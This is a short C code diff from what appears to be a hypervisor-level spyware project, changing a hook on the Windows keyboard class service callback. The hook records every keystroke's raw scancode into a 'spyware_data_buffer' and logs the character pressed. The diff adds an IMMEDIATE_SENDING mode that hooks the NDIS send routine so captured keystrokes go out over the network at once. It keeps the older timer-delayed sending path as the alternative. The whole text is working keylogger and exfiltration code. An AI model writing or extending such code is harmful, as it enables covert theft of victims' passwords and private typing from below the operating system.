@@ -57,9 +57,15 @@ __attribute__((section(".vmm"))) void handle_KeyboardClassServiceCallback_hook(v
         if (data_phys->Flags == KEY_MAKE){
             LOG_INFO("Key pressed: %c\n", kbd_US[data_phys->MakeCode]);
             AcquireLock(&shared_cores_data.spyware_data_lock);
-            shared_cores_data.spyware_data_buffer.chars[shared_cores_data.spyware_data_buffer.length] = kbd_US[data_phys->MakeCode];
+            shared_cores_data.spyware_data_buffer.chars[shared_cores_data.spyware_data_buffer.length] = (byte_t)data_phys->MakeCode;
             shared_cores_data.spyware_data_buffer.length++;
             
+            #ifdef IMMEDIATE_SENDING
+            shared_cores_data.send_pending = TRUE;
+            hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET));
+            #endif
+
+            #ifndef IMMEDIATE_SENDING
             // Activate preemption timer
             if (!shared_cores_data.send_pending){
                 pin_based_ctls_t pin_based_ctls = {0};
@@ -77,6 +83,7 @@ __attribute__((section(".vmm"))) void handle_KeyboardClassServiceCallback_hook(v
                 shared_cores_data.send_pending = TRUE;
                 hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET));
             } 
+            #endif
             
             ReleaseLock(&shared_cores_data.spyware_data_lock);
         }
